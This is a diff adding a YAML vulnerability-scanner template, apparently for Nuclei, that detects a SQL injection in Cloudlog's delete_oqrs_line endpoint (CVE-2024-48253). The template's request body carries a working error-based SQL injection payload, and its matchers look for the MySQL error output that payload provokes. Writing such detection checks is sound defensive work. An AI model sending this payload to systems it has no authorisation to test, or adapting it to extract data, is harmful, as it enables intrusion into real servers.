@@ -1,0 +1,29 @@
+id: cloudlog-delete-oqrs-line-sqli
+info:
+  name: Cloudlog delete_oqrs_line SQL Injection Vulnerability (CVE-2024-48253)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,CVE-2024-48253
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php/oqrs/delete_oqrs_line"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "id=GTID_SUBSET(CONCAT((MID((IFNULL(CAST(MD5({{t1}}) AS NCHAR),0x20)),1,190))),666)"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "set specification"
+          - "Error Number:"
+          - "{{t2}}"
